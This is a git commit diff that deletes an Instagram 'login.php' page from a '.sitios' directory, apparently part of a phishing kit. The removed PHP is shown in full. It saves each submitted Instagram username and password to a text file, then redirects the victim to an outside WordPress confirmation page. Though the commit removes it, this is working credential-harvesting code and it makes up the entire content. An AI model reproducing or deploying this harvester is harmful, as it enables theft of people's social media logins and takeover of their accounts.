fa6121960b0ac0ee9eff8032df848bfb204e4aca
Aduvi1 <82288774+Aduvi1@users.noreply.github.com>
2021-08-02 08:49:10 -0500

    Delete .sitios/instagram directory

--- .sitios/instagram/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://concursosecuadordesign.wordpress.com/confirmacion/?preview=true');
-exit();
-?>
